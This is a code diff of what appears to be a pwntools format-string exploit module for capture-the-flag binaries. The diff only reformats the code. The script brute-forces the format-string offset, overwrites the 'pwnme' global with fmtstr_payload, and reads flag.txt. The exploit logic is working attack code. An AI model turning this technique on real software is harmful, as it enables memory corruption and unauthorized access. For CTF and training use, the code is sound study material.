@@ -1,16 +1,19 @@
 from pwn import *
-context.clear(arch = 'amd64')
-#This module will only work on binaries that contain the 'pwnme' global variable, and only if the allowed user input is long enough (it should be)
+
+context.clear(arch='amd64')
+
+
+# This module will only work on binaries that contain the 'pwnme' global variable, and only if the allowed user input is long enough (it should be)
 
 def exploit(binary):
-    #Finding the offset index
+    # Finding the offset index
     i = 1
-    #Note: I could do this all in one local connection with a %p%p... type payload, but I think this is slightly safer if my write length is low.
-    #We still might want to adjust depending on optimization concerns.
+    # Note: I could do this all in one local connection with a %p%p... type payload, but I think this is slightly safer if my write length is low.
+    # We still might want to adjust depending on optimization concerns.
     while True:
         p = process(binary)
-        
-        payload = ('%'+str(i) + '$p').encode('ascii')
+
+        payload = ('%' + str(i) + '$p').encode('ascii')
         p.sendline(payload)
         try:
             p.recvuntil(b'0x')
@@ -31,17 +34,17 @@ def exploit(binary):
     payload = fmtstr_payload(index, {e.sym['pwnme']: 1337}, 0)
     p.sendline(payload)
 
-    try: # Do we have a shell?
+    try:  # Do we have a shell?
         p.sendline(b'cat flag.txt')
-    except: # Probably just printed the flag
+    except:  # Probably just printed the flag
         pass
 
     output = p.recvall(timeout=0.2)
     print(b'output:', output)
-    #added encoding unicode_escape to stop it freaking out about non-standard bytes.
+    # added encoding unicode_escape to stop it freaking out about non-standard bytes.
     flag = re.findall(flag_regex, output.decode('unicode_escape'))
     print(flag)
-    if flag: # Success
+    if flag:  # Success
         return flag[0]
-    else: # Failure
+    else:  # Failure
         return
